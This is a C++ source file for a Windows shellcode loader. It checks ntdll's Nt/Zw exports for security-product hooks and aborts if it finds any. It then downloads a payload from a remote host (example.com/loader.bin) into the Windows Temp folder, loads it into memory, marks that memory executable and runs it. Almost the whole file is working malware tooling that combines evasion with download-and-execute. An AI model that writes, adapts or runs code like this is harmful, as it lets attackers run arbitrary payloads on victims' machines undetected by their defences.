#include <windows.h>
#include <iostream>
#include <fstream>
#include <winhttp.h>
#include <vector>
#include <string>
#include <set> 

#pragma comment(lib, "winhttp.lib")

bool HookedFunc(PVOID functionAddress)
{
    // Syscall stubs start with these bytes in ntdll
    unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };

    // Check if the first few bytes match the expected prologue
    if (memcmp(functionAddress, syscallPrologue, sizeof(syscallPrologue)) == 0) {
        return false; 
    }

    // If it's a JMP instruction, likely a hook
    if (*(unsigned char*)functionAddress == 0xE9 || *(unsigned char*)functionAddress == 0xE8) {
        return true; 
    }

    return true; 
}

bool SyscallHooked() {
    bool syscallHooked = false;

    // List of functions to ignore during verification
    std::set<std::string> ignoreList = {
        "NtGetTickCount",
        "NtQuerySystemTime",
        "NtdllDefWindowProc_A",
        "NtdllDefWindowProc_W",
        "NtdllDialogWndProc_A",
        "ZwQuerySystemTime",
        "NtdllDialogWndProc_W"
    };

    // Get ntdll base address
    HMODULE libraryBase = LoadLibraryA("ntdll");
    if (!libraryBase) {
        std::cerr << "Failed load ntdll.dll\n";
        return true; 
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

    // Locate export address table
    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

    // Offsets to list of exported functions and their names
    PDWORD addressOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

    // Iterate through exported functions of ntdll
    for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++) {
        // Resolve exported function name
        DWORD functionNameRVA = addressOfNamesRVA[i];
        DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
        char* functionName = (char*)functionNameVA;

        // Resolve exported function address
        DWORD_PTR functionAddressRVA = addressOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
        PVOID functionAddress = (PVOID)((DWORD_PTR)libraryBase + functionAddressRVA);

        // Ignore functions in the exception list
        if (ignoreList.find(functionName) != ignoreList.end()) {
            printf("Ignoring function: %s\n", functionName);
            continue;
        }

        // Only interested in Nt|Zw functions
        if (strncmp(functionName, "Nt", 2) == 0 || strncmp(functionName, "Zw", 2) == 0) {
            if (HookedFunc(functionAddress)) {
                printf("Hooked or modified: %s : %p\n", functionName, functionAddress);
                syscallHooked = true; // Mark as hooked if any function is modified
            }
            else {
                printf("Not hooked: %s : %p\n", functionName, functionAddress);
            }
        }
    }


    return syscallHooked;
}

bool DomainOnline(const wchar_t* domain) {
    HINTERNET hSession = WinHttpOpen(L"ShellcodeRunner", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"HEAD", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bool online = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return online;
}

bool downloadShellcode(const wchar_t* domain, const wchar_t* path, const wchar_t* outputFilePath) {
    HINTERNET hSession = WinHttpOpen(L"ShellcodeDownloader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bool success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL);
    if (!success) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD bytesRead;
    BYTE buffer[8192];
    HANDLE hFile = CreateFile(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    do {
        if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
            CloseHandle(hFile);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    } while (bytesRead > 0);

    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return true;
}


int main() {
    const wchar_t* domain = L"example.com"; 
    const wchar_t* path = L"/loader.bin";
    const wchar_t* outputFilePath = L"C:\\Windows\\Temp\\shellcode.bin";

    if (!DomainOnline(domain)) {
        std::cerr << "Domain offline\n";
        return 1;
    }

    if (SyscallHooked()) {
        std::cerr << "Syscall hooks detected\n";
        return 1;
    }

    if (!downloadShellcode(domain, path, outputFilePath)) {
        std::cerr << "Failed to download the shellcode\n";
        return 1;
    }

    // Read the shellcode from the downloaded file
    std::ifstream file(outputFilePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open the shellcode file\n";
        return 1;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<char> buffer(size);
    if (!file.read(buffer.data(), size)) {
        std::cerr << "Failed to read the shellcode\n";
        return 1;
    }

    void* execMemory = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMemory) {
        std::cerr << "Failed to allocate memory\n";
        return 1;
    }

    memcpy(execMemory, buffer.data(), size);

    DWORD oldProtect;
    if (!VirtualProtect(execMemory, size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Failed to change memory protection\n";
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return 1;
    }

    auto shellcodeFunc = reinterpret_cast<void(*)()>(execMemory);
    shellcodeFunc();

    VirtualFree(execMemory, 0, MEM_RELEASE);

    return 0;
}
